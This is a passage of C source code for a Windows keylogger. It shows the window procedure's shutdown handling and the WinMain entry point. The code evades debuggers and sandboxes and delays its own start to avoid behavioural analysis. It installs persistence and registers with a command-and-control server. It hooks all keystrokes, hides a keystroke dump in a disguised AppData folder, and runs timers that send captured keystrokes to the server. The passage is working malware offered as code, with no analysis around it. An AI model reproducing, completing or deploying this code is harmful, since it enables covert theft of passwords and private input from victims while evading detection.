             */
            log_write("shutdown: dumping buffer to disk");
            {
                /* heap allocation — KeyEvent[BUFFER_SIZE] would overflow the stack */
                KeyEvent *dump = (KeyEvent*)HeapAlloc(GetProcessHeap(), 0,
                                                      BUFFER_SIZE * sizeof(KeyEvent));
                if (!dump) {
                    log_write("shutdown: out of memory for dump");
                } else {
                    int dump_count = buffer_flush(dump, BUFFER_SIZE);
                    if (dump_count > 0) {
                        char dump_path[MAX_PATH];
                        char appdata[MAX_PATH];
                        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
                            snprintf(dump_path, MAX_PATH,
                                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
                            HANDLE hf = CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
                                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                            if (hf != INVALID_HANDLE_VALUE) {
                                DWORD written;
                                DWORD expected = (DWORD)(dump_count * sizeof(KeyEvent));
                                WriteFile(hf, dump, expected, &written, NULL);
                                if (written != expected) {
                                    /* partial write = corrupt dump; discard */
                                    CloseHandle(hf);
                                    DeleteFileA(dump_path);
                                } else {
                                    CloseHandle(hf);
                                }
                            }
                        }
                    }
                    HeapFree(GetProcessHeap(), 0, dump);
                }
            }
            /* also fire a fire-and-forget shutdown heartbeat */
            if (g_agent_registered) {
                char body[384];
                snprintf(body, sizeof(body),
                         "{\"agent_id\":\"%s\",\"status\":\"shutdown\"}",
                         g_agent_id);
                http_post("/api/agents/heartbeat", body, NULL, 0);
            }
            log_write("shutdown: complete");
            return TRUE;

        case WM_ENDSESSION:
            if (wParam) {
                hook_uninstall();
            }
            return 0;

        case WM_CLOSE:
        case WM_DESTROY:
            /* flush pending keystrokes before exiting */
            if (g_agent_registered) c2_exfil();
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static HWND create_hidden_window(HINSTANCE hInstance) {
    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = WINDOW_CLASS;
    RegisterClassExW(&wc);

    return CreateWindowExW(0, WINDOW_CLASS, L"",
                           WS_OVERLAPPED, 0, 0, 0, 0,
                           HWND_MESSAGE, NULL, hInstance, NULL);
}

/* ============================================================================
 * SECTION 14: ENTRY POINT
 * ============================================================================ */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nCmdShow) {
    /* --- stealth checks --- */
    if (stealth_check_debugger()) {
        return 1;
    }

    if (stealth_check_sandbox()) {
        return 1;
    }

    /* --- prevent multiple instances (mutex watchdog) --- */
    if (!mutex_acquire()) {
        /* another instance is already running — exit silently */
        return 1;
    }

    /* --- delayed execution to evade behavioral analysis --- */
    {
        LARGE_INTEGER perf_freq, perf_now;
        QueryPerformanceFrequency(&perf_freq);
        QueryPerformanceCounter(&perf_now);
        /* seed with a hardware-derived value instead of time */
        srand((unsigned int)(perf_now.LowPart ^ perf_freq.LowPart));

        DWORD delay_ms = 30000 + (rand() % 30000);  /* 30-60 seconds */
        Sleep(delay_ms);
    }

    /* --- initialize logging --- */
    log_init();
    log_write("agent starting");

    /* --- load configuration --- */
    char config_path[MAX_PATH];
    GetModuleFileNameA(NULL, config_path, MAX_PATH);
    char *slash = strrchr(config_path, '\\');
    if (slash) {
        *(slash + 1) = '\0';
        strcat(config_path, "agent_config.json");
    } else {
        strcpy(config_path, "agent_config.json");
    }
    config_load(config_path);
    config_apply_default_url();

    /* --- install persistence --- */
    persistence_install();

    /* --- initialize keystroke buffer --- */
    buffer_init();
    g_startup_ticks = GetTickCount();

    /* --- register with C2 --- */
    c2_register();

    /* --- resend any keystrokes saved from a previous unclean shutdown --- */
    {
        char dump_path[MAX_PATH];
        char appdata[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
            snprintf(dump_path, MAX_PATH,
                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
            HANDLE hf = CreateFileA(dump_path, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING,
                                    FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                KeyEvent recovery_buf[BUFFER_SIZE];
                DWORD fsize = GetFileSize(hf, NULL);
                if (fsize > 0 && fsize <= BUFFER_SIZE * sizeof(KeyEvent)) {
                    DWORD read;
                    ReadFile(hf, recovery_buf, fsize, &read, NULL);
                    int n_events = (int)(read / sizeof(KeyEvent));
                    /* push recovered events back into the buffer */
                    EnterCriticalSection(&g_buffer_cs);
                    for (int i = 0; i < n_events; i++) {
                        int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
                        g_keystroke_buffer[idx] = recovery_buf[i];
                        g_buffer_count++;
                        if (g_buffer_count >= BUFFER_SIZE) {
                            g_buffer_head = (g_buffer_head + 1) % BUFFER_SIZE;
                            g_buffer_count--;
                        }
                    }
                    LeaveCriticalSection(&g_buffer_cs);
                    log_write("startup: recovered keystrokes from shutdown dump");
                }
                CloseHandle(hf);
                /* keep the dump until hook is confirmed working */
            }
        }
    }

    /* --- install keyboard hook --- */
    if (!hook_install()) {
        log_write("fatal: failed to install hook");
        return 1;
    }

    /* --- create hidden window for timers --- */
    HWND hwnd = create_hidden_window(hInstance);
    if (!hwnd) {
        log_write("fatal: failed to create message window");
        hook_uninstall();
        return 1;
    }

    /* set up periodic timers */
    SetTimer(hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
    SetTimer(hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
    SetTimer(hwnd, TIMER_CONFIG_POLL, g_config_poll_interval_sec * 1000, NULL);
    SetTimer(hwnd, TIMER_REPAIR, REPAIR_INTERVAL_MS, NULL);

    /* hook + message window confirmed — safe to consume the shutdown dump */
    {
        char dump_path[MAX_PATH];
        char appdata[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
            snprintf(dump_path, MAX_PATH,
                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
            DeleteFileA(dump_path);
        }
    }

    log_write("agent: entering message loop");

    /* --- message loop (required for WH_KEYBOARD_LL) --- */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    /* --- cleanup --- */
    KillTimer(hwnd, TIMER_EXFIL);
    KillTimer(hwnd, TIMER_HEARTBEAT);
    KillTimer(hwnd, TIMER_CONFIG_POLL);
    KillTimer(hwnd, TIMER_REPAIR);
    DestroyWindow(hwnd);
    hook_uninstall();
    DeleteCriticalSection(&g_buffer_cs);

    log_write("agent: shutting down");
    return 0;
}
